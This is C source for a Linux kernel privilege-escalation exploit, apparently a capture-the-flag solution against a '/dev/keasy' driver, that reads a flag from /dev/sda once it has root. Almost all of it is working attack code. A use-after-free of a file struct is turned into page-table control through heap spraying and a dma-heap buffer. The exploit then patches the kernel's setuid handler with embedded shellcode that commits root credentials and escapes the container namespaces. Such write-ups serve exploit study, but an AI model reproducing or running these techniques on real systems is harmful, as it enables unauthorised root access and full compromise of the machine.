#define _GNU_SOURCE
#include "./libexp.h"
#include <linux/dma-buf.h>
#include <linux/dma-heap.h>

#define DEV "/dev/keasy"

#define FILP_SPRAY 0x100
#define PTE_SPRAY 0x1000
#define FACTOR 3


int fd = -1;
int target_fd;
int dma_heap_fd;
int temp_files[FILP_SPRAY];
void* phys_base;
void* dma_buffer;
void* target_vaddr;
void* attack_vaddr;
void* setuid_phyaddr;
void* maps[PTE_SPRAY];
void* more_maps[PTE_SPRAY];
void* placeholder_maps[PTE_SPRAY];

/*
	# calc kbase
	sub r11, 0x96b00

	# init_cred
	mov rdi, r11
	add rdi, 0x1445ed8

	# call commit_creds(init_cred)
	mov rax, r11
	add rax, 0xae620
	call rax

	# call get_pid_task(1, PIDTYPE_PID)
	mov rdi, 1
	mov rax, r11
	add rax, 0xa3750
	call rax

	mov rdi, rax

	# init_task
	mov rsi, r11
	add rsi, 0x1413240

	# call switch_task_namespace
	mov rax, r11
	add rax, 0xac140
	call rax

	# init_fs
	mov rdi, r11
	add rdi, 0x1538248

	# call copy_fs_struct(init_fs)
	mov rax, r11
	add rax, 0x027f890
	call rax

	mov r12, rax

	# call get_pid_task(1, PIDTYPE_PID)
	mov rdi, 2
	mov rax, r11
	add rax, 0xa3750
	call rax


	mov [rax + 0x740], r12

	ret
*/

uint8_t shellcode[] = {
      0x49, 0x81, 0xeb, 0x00, 0x6b, 0x09, 0x00, 0x4c, 0x89, 0xdf, 0x48, 0x81,
  0xc7, 0xd8, 0x5e, 0x44, 0x01, 0x4c, 0x89, 0xd8, 0x48, 0x05, 0x20, 0xe6,
  0x0a, 0x00, 0xff, 0xd0, 0x48, 0xc7, 0xc7, 0x01, 0x00, 0x00, 0x00, 0x4c,
  0x89, 0xd8, 0x48, 0x05, 0x50, 0x37, 0x0a, 0x00, 0xff, 0xd0, 0x48, 0x89,
  0xc7, 0x4c, 0x89, 0xde, 0x48, 0x81, 0xc6, 0x40, 0x32, 0x41, 0x01, 0x4c,
  0x89, 0xd8, 0x48, 0x05, 0x40, 0xc1, 0x0a, 0x00, 0xff, 0xd0, 0x4c, 0x89,
  0xdf, 0x48, 0x81, 0xc7, 0x48, 0x82, 0x53, 0x01, 0x4c, 0x89, 0xd8, 0x48,
  0x05, 0x90, 0xf8, 0x27, 0x00, 0xff, 0xd0, 0x49, 0x89, 0xc4, 0x48, 0xc7,
  0xc7, 0x02, 0x00, 0x00, 0x00, 0x4c, 0x89, 0xd8, 0x48, 0x05, 0x50, 0x37,
  0x0a, 0x00, 0xff, 0xd0, 0x4c, 0x89, 0xa0, 0x40, 0x07, 0x00, 0x00, 0xc3,

};
//   0x48, 0x8d, 0x3d, 0x48, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0x00, 0x00,
//   0x00, 0x00, 0x4c, 0x89, 0xd8, 0x48, 0x05, 0xe0, 0x5e, 0x23, 0x00, 0xff,
//   0xd0, 0x48, 0x89, 0xc7, 0x4c, 0x89, 0xd8, 0x48, 0x05, 0x20, 0xc2, 0x0a,
//   0x00, 0xff, 0xd0, 0x48, 0x8d, 0x3d, 0x21, 0x00, 0x00, 0x00, 0x48, 0xc7,
//   0xc6, 0x00, 0x00, 0x00, 0x00, 0x4c, 0x89, 0xd8, 0x48, 0x05, 0xe0, 0x5e,
//   0x23, 0x00, 0xff, 0xd0, 0x48, 0x89, 0xc7, 0x4c, 0x89, 0xd8, 0x48, 0x05,
//   0x20, 0xc2, 0x0a, 0x00, 0xff, 0xd0, 0xc3, 0x2f, 0x70, 0x72, 0x6f, 0x63,
//   0x2f, 0x31, 0x2f, 0x6e, 0x73, 0x2f, 0x6d, 0x6e, 0x74, 0x00, 0x2f, 0x70,
//   0x72, 0x6f, 0x63, 0x2f, 0x31, 0x2f, 0x6e, 0x73, 0x2f, 0x70, 0x69, 0x64,
//   0x00
// };

void init() {
    pin_to_cpu(0);
    set_fd_limit_max();
}

void uaf() {
    if (!ioctl(fd, 0x1337, -1)) error("Error freeing target filp");
    info("Freed target filp");
}

void crosscache_init() {
    int i = 0;

    info("Stage 1 spraying filp");
    for (i = 0; i < FILP_SPRAY/FACTOR; i++) {
        char template[] = "/jail/shunt-XXXXXX\0";
        temp_files[i] = create_temp_file(template);
        // info("t: %d, i: %d", temp_files[i], i);
    }

    uaf();
    target_fd = i + 4;  // I know I'm bad at c but why do I have to prove it everytime I code

    info("Stage 2 praying filp");
    for (i = FILP_SPRAY/FACTOR; i < FILP_SPRAY; i++) {
        char template[] = "/jail/shunt-XXXXXX\0";
        temp_files[i] = create_temp_file(template);
    }
}

void crosscache_free() {
    info("Freeing filp slabs");
    for (int i = FILP_SPRAY-1; i > 0; --i) {
        close(temp_files[i]);
    }
}

void crosscache_coup() {
    for (int i = 0; i < PTE_SPRAY; i++) {
        maps[i] = mmap(0, PAGE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (maps[i] == MAP_FAILED) error("Error allocating memory");

        *(uint64_t*)maps[i] = (uint64_t)maps[i];
    }

    info("PTE spray complete");
}

int main(){
    init();
    
    fd = open(DEV, O_RDONLY);
    if (fd < 0) error("Error opening device");

    crosscache_init();
    crosscache_free();
    crosscache_coup();

    for (int i = 0; i < PAGE; i++) {
        if (dup(target_fd) < 0) error("dupfd: %d");
    }

    for (int i = 0; i < PTE_SPRAY; i++) {
        if (maps[i] != *(uint64_t*)maps[i]){
            info("Found overlap", maps[i]);
            target_vaddr = maps[i];
            attack_vaddr = *(uint64_t*)maps[i];
            break;
        }
    }

    info("target vaddr: %p", target_vaddr);
    info("attack vaddr: %p", attack_vaddr);

    size_t size_of_memory_region = PAGE * 512 * 73;
    char* start_virtual_address = mmap((void*)0x1000, size_of_memory_region, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (start_virtual_address  == MAP_FAILED) error("mmap");

    info("More PTE spray, head: %p", start_virtual_address);
    unsigned char *addr = (unsigned char *)start_virtual_address;
    for (uint64_t i = 0; i < size_of_memory_region; i+= 0x1000) {
        *(uint64_t*)(addr + i) = start_virtual_address + i;
    }

    // copied from vamous blog
    struct dma_heap_allocation_data data = {
        .fd = 0,
        .len = 0x1000,
        .fd_flags = O_RDWR,
        .heap_flags = 0
    };
    

    dma_heap_fd = open("/dev/dma_heap/system", O_RDONLY);
    if (dma_heap_fd < 0) error("Error opening dma-heap");

    if (ioctl(dma_heap_fd, DMA_HEAP_IOCTL_ALLOC, &data) < 0) error("DMA_HEAP_IOCTL_ALLOC");

    int dma_buf_fd = data.fd;
    info("dma_buf fd: %d", dma_buf_fd);

    if (munmap(target_vaddr, PAGE) < 0) error("Error unmapping vaddr: %p", target_vaddr);
    dma_buffer = mmap(0, PAGE, PROT_READ | PROT_WRITE, MAP_SHARED, dma_buf_fd, 0);
    if (dma_buffer == MAP_FAILED) error("mmap");
    info("dma_heap: %p", dma_buffer);

    char* start_virtual_address2 = mmap(0, size_of_memory_region, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (start_virtual_address2  == MAP_FAILED) error("mmap");

    info("More More PTE spray, head: %p", start_virtual_address2);
    addr = (unsigned char *)start_virtual_address2;
    for (uint64_t i = 0; i < size_of_memory_region; i+= 0x1000) {
        *(uint64_t*)(addr + i) = start_virtual_address2 + i;
    }

    info("Searching user page in page table");
    while (true) {

        for (int i = 0; i < PAGE*2; i++) {
            int dupfd = dup(target_fd);
            if ( dupfd < 0) error("dupfd");
        }

        *(uint64_t*)dma_buffer = ((uint64_t*)dma_buffer)[1];
        for (char* addr = start_virtual_address2; addr < start_virtual_address2+size_of_memory_region; addr+=PAGE) {
            // info("%p\t%p", addr, *(uint64_t*)addr);
            if (
                (((uint8_t)(*(uint64_t*)dma_buffer >> 60)) == (uint8_t)8) &&
                (((uint8_t)(*(uint64_t*)dma_buffer) & 0xff) == (uint8_t)0x67) &&
                (*(uint64_t*)(addr) != (uint64_t)addr)
            ) {
                // info("%p\t%p", (uint64_t)addr, *(uint64_t*)addr);
                info("Found victim page, dma_buffer[0]: %p", addr);
                target_vaddr = addr;
                // char* next = addr+PAGE;
                goto escalate;
            }
        }
    }

escalate:
    // for (char* phys = 0x9c000)
    *(uint64_t*)dma_buffer = 0x9c000;   // copied from shit_crops exploit
    *(uint64_t*)dma_buffer |= 0x8000000000000067;
    phys_base = *(uint64_t*)target_vaddr - 0x1c04063;
    info("Physical base: %p", phys_base);

    *(uint64_t*)dma_buffer = phys_base + 0x96990; // setuid
    *(uint64_t*)dma_buffer |= 0x8000000000000067;

    setuid_phyaddr = target_vaddr+0x990;
    memcpy(setuid_phyaddr, shellcode, sizeof(shellcode));

    syscall(SYS_setuid);

    if (getuid() == 0) {
        info("Mom I'm root");
        info("uid: %d", getuid());
        info("Process id: %d", getpid());


        if (sendfile(fileno(stdout), open("/dev/sda", O_RDONLY), 0, 0x100) < 0) error("No flag");

        sleep(0x1000);
    }

    info("No root work hard :(");
    sleep(0x1000);
}
